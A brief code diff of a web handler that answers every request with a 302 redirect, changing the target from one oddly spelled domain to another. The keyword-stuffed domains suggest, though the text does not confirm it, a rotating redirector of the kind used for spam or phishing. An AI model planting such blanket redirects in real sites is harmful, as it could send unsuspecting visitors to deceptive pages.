@@ -5,7 +5,7 @@ serve((_req) => {
   return new Response(null, {
     status: 302,
     headers: {
-      Location: "https://potlatch1revlwtoday.info/p1/",
+      Location: "https://revlewpotlatch1now.help/p1",
     },
   });
 });
